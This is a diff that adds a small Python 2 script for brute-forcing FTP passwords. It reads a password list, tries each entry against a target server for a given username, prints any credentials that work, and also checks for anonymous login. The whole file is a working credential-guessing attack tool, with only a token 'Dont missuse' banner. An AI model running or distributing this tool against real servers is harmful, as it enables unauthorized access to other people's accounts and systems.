@@ -1,0 +1,55 @@
+#!/usr/bin/env python
+# coding:utf-8 
+
+print "Dont missuse Of This"
+
+import argparse
+import sys
+from ftplib import FTP
+
+def help():
+    print info
+    sys.exit(0)
+def check_amzker_login(ip):
+    try:
+        ftp = FTP(ip)
+        ftp.login()
+        print "\n[+] Amzker login is open."
+        print "\n[+] USERNAME : amzker"
+        print "\n[+] PASSWORD : amzker\n"
+        ftp.quit()
+    except:
+        pass
+def ftp_login(ip, username, password):
+    try:
+        ftp = FTP(ip)
+        ftp.login(username, password)
+        ftp.quit()
+        print "\n[!] YOUR LUCK IS GOOD."
+        print "\n[!] Username : {}".format(username)
+        print "\n[!] Password : {}".format(password)
+        sys.exit(0)
+    except:
+        pass
+def brute_force(ip, username, passlist):
+    try:
+        passlist = open(passlist, "r")
+        words = passlist.readlines()
+        for word in words:
+            word = word.strip()
+            ftp_login(ip, username, word)
+
+    except:
+        print "\n[-] No Passlist Found. \n"
+        sys.exit(0)
+parser = argparse.ArgumentParser()
+parser.add_argument("-ip", "--target")
+parser.add_argument("-l", "--username")
+parser.add_argument("-p", "--passlist")
+args = parser.parse_args()
+target = args.target
+username = args.username
+passlist = args.passlist
+brute_force(target, username, passlist)
+check_amzker_login(target)
+print "\n[-] OK BYE BYE \n"
